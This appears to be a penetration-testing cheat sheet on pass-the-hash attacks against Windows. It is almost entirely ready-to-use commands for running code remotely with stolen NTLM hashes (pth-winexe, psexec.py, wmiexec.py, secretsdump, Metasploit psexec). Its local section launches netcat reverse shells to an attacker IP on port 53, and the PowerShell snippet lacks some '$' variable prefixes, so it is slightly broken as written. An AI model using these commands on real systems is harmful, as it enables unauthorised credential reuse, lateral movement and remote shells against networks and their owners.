# Pass the Hash / Password

{% hint style="warning" %}
!**!! NTLMv2 hashes can not be passed !!!**

**only NTLM hashes can be passed**

FOR TOOLS THAT HAVE TO USE LM HASH**E**S BEFORE NTLM HASH, ADD A BLANK LM HASH:

_aad3b435b51404eeaad3b435b51404ee_
{% endhint %}

## Remote

Pass the hash remotely to gain a shell:

### pth-winexe

```
pth-winexe -U <domain>/<username>%<hash> //<target-ip> cmd
```

Sometimes you may need to reference the target by its hostname (add an entry to /etc/hosts to make it resolve):

```
pth-winexe -U <domain>/<username>%<hash> //<target-hostname> cmd
```

Alternative:

```
export SMBHASH=<hash>
pth-winexe -U <domain>/<username>% //<target-ip> cmd
```

{% hint style="info" %}
remember the first hash portion is a blank LM hash between these signs : and %
{% endhint %}

### secretsdump

```
secretsdump.py megacorp/hesher:"password123!"@192.168.56.116
```

### psexec.py / winexec.py

```
python psexec.py "hesher":"password123!"@192.168.56.115

python psexec.py "hesher":@192.168.56.115 -hashes [nthash]

python wmiexec.py "hesher":"password123!"@192.168.56.115
```

### metasploit psexec

```
use exploit/windows/smb/psexec
```

## Local

Pass the hash locally using runas:

```
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <hash> "C:\Windows\Temp\nc.exe <attacker-ip> 53 -e cmd.exe"
```

Pass the hash locally using PowerShell:

```
secpasswd = ConvertTo-SecureString "<hash>" -AsPlainText -Force
mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
computer = "<hostname>"
[System.Diagnostics.Process]::Start("C:\Windows\Temp\nc.exe","<attacker-ip> 53 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
```

Pass the hash locally using psexec:

```
psexec64 \\<hostname> -u <username> -p <hash> -h "C:\Windows\Temp\nc.exe <attacker-ip> 53 -e cmd.exe"
```
